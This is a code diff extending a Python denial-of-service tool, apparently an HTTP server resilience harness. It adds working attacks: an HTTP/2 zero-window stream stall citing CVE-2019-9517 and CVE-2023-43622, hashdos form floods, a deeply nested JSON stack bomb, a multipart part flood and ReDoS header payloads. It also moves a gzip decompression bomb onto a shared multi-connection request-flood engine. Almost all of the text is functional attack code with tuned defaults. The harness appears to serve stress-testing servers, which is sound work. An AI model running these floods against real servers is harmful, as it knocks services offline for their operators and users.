@@ -192,6 +192,13 @@ def _h2_get_block(authority):
     return bytes([0x82, 0x86, 0x84, 0x01]) + _hpack_str(authority.encode())
 
 
+def _h2_get_block_path(authority, path):
+    """A GET header block for an arbitrary path: :method/:scheme indexed, :path
+    and :authority literal WITHOUT indexing (name indices 4 and 1)."""
+    return (bytes([0x82, 0x86, 0x04]) + _hpack_str(path.encode())
+            + bytes([0x01]) + _hpack_str(authority.encode()))
+
+
 def _new_stats():
     return dict(established=0, reaped=0, frames_sent=0, bytes_sent=0, connect_errors=0)
 
@@ -356,6 +363,29 @@ def empty_frame_flood(args):
     return _h2_flood(args, body)
 
 
+def window_stall(args):
+    # Advertise SETTINGS_INITIAL_WINDOW_SIZE = 0, open many streams each requesting
+    # a large response, then never send WINDOW_UPDATE. The server generates the
+    # responses and buffers data it can never flush (CVE-2019-9517 / CVE-2023-43622).
+    settings0 = _frame(0x4, 0, 0, b"\x00\x04\x00\x00\x00\x00")   # INITIAL_WINDOW_SIZE = 0
+    block = _h2_get_block_path(args.host, f"/json/{args.stall_count}")
+
+    def body(s, deadline):
+        f = nb = 0
+        s.sendall(settings0); f += 1; nb += len(settings0)
+        sid = 1
+        for _ in range(args.stall_streams):
+            s.sendall(_frame(0x1, 0x5, sid, block)); f += 1; nb += len(block) + 9
+            sid += 2
+        # Hold the streams open, never granting window, so the buffered responses
+        # are pinned for the server-configured stalled-stream lifetime.
+        while time.monotonic() < deadline:
+            time.sleep(0.5)
+        return f, nb
+
+    return _h2_flood(args, body)
+
+
 # ── Decompression bomb (HTTP/1.1) ────────────────────────────────────────────
 
 def _gzip_bomb(size):
@@ -373,14 +403,11 @@ def _gzip_bomb(size):
     return bytes(out)
 
 
-def decompression_bomb(args):
-    # POST a small gzip body that inflates to gigabytes. A server that decodes
-    # request Content-Encoding before any size check inflates into memory and
-    # OOMs; one that does not is a clean "survived".
-    bomb = _gzip_bomb(args.bomb_size)
-    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
-            f"Content-Encoding: gzip\r\nContent-Type: application/octet-stream\r\n"
-            f"Content-Length: {len(bomb)}\r\n\r\n").encode() + bomb)
+def _h1_request_flood(args, req):
+    """N connections each send one fixed HTTP/1.1 request repeatedly until the
+    deadline. The shared engine behind every payload/parser attack; `frames_sent`
+    counts requests. These are differential: a request only bites a server that
+    actually parses the body/headers it targets."""
     deadline = time.monotonic() + args.duration
     stats = _new_stats()
     lock = threading.Lock()
@@ -419,6 +446,63 @@ def decompression_bomb(args):
     return stats
 
 
+def decompression_bomb(args):
+    # POST a small gzip body that inflates to gigabytes. A server that decodes
+    # request Content-Encoding before any size check inflates into memory and
+    # OOMs; one that does not is a clean "survived".
+    bomb = _gzip_bomb(args.bomb_size)
+    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+            f"Content-Encoding: gzip\r\nContent-Type: application/octet-stream\r\n"
+            f"Content-Length: {len(bomb)}\r\n\r\n").encode() + bomb)
+    return _h1_request_flood(args, req)
+
+
+def hashdos(args):
+    # A form body of many distinct keys. A server that parses it into a hash map
+    # with an un-seeded hash degrades to O(n^2) on insertion (CVE-2011-3414 era).
+    body = b"&".join(b"k%d=1" % i for i in range(args.hashdos_keys))
+    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
+    return _h1_request_flood(args, req)
+
+
+def json_nesting_bomb(args):
+    # A tiny, deeply nested JSON array. A recursive-descent parser without a depth
+    # cap blows the stack -> process crash (a distinct, non-OOM verdict).
+    body = b"[" * args.json_depth + b"]" * args.json_depth
+    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+            f"Content-Type: application/json\r\n"
+            f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
+    return _h1_request_flood(args, req)
+
+
+def multipart_flood(args):
+    # multipart/form-data with tens of thousands of tiny parts: each part is an
+    # allocation + bookkeeping entry, overflowing part/field maps.
+    boundary = b"----httparenaResBomb"
+    part = (b"--" + boundary + b"\r\n"
+            b'Content-Disposition: form-data; name="f"\r\n\r\nx\r\n')
+    body = part * args.multipart_parts + b"--" + boundary + b"--\r\n"
+    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n").encode()
+           + b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
+           + f"Content-Length: {len(body)}\r\n\r\n".encode() + body)
+    return _h1_request_flood(args, req)
+
+
+def redos_headers(args):
+    # Best-effort probe against commonly ReDoS-prone header parsers (Accept,
+    # Content-Disposition, Range). A regex that backtracks catastrophically burns
+    # a CPU core on one request; RE2/string parsers are immune (a clean survived).
+    run = b"a" * args.redos_pad
+    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
+           + b"Accept: text/html," + run + b" ;q=0\r\n"
+           + b'Content-Disposition: form-data; name="x"; filename="' + run + b'\r\n'
+           + b"Range: bytes=" + b",".join(b"0-0" for _ in range(max(1, args.redos_pad // 4))) + b"\r\n"
+           + b"Connection: keep-alive\r\n\r\n")
+    return _h1_request_flood(args, req)
+
+
 ATTACKS = {
     "slow-body": slow_body,
     "slow-headers": slow_headers,
@@ -431,6 +515,11 @@ ATTACKS = {
     "settings-flood": settings_flood,
     "ping-flood": ping_flood,
     "empty-frame-flood": empty_frame_flood,
+    "window-stall": window_stall,
+    "hashdos": hashdos,
+    "json-nesting-bomb": json_nesting_bomb,
+    "multipart-flood": multipart_flood,
+    "redos-headers": redos_headers,
 }
 
 
@@ -446,6 +535,12 @@ def main():
     p.add_argument("--body-size", type=int, default=10 * 1024 * 1024, dest="body_size")
     p.add_argument("--drip-bytes", type=int, default=1, dest="drip_bytes")
     p.add_argument("--bomb-size", type=int, default=1024 * 1024 * 1024, dest="bomb_size")
+    p.add_argument("--hashdos-keys", type=int, default=100000, dest="hashdos_keys")
+    p.add_argument("--json-depth", type=int, default=100000, dest="json_depth")
+    p.add_argument("--multipart-parts", type=int, default=50000, dest="multipart_parts")
+    p.add_argument("--redos-pad", type=int, default=4000, dest="redos_pad")
+    p.add_argument("--stall-count", type=int, default=5000, dest="stall_count")
+    p.add_argument("--stall-streams", type=int, default=64, dest="stall_streams")
     p.add_argument("--tls", action="store_true")
     args = p.parse_args()
 
